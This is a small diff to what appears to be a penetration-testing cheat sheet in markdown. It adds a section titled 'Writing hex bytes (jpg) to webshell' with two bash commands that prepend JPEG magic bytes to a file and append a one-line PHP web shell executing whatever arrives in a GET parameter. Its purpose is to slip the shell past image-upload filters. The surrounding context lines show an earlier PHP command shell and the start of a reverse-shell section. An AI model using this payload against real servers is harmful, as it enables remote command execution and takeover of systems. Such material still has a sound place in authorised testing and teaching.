@@ -14,6 +14,14 @@ if(isset($_REQUEST['cmd'])){
 	} 
 ?>
 ```
+
+##### Writing hex bytes (jpg) to webshell
+```BASH
+echo 'FFD8FFDB' | xxd -r -p > webshell.php.jpg
+echo '<?=`$_GET[0]`?>' >> webshell.php.jpg
+```
+
+
 ### Linux reverse shells
 ##### Bash
 ```BASH
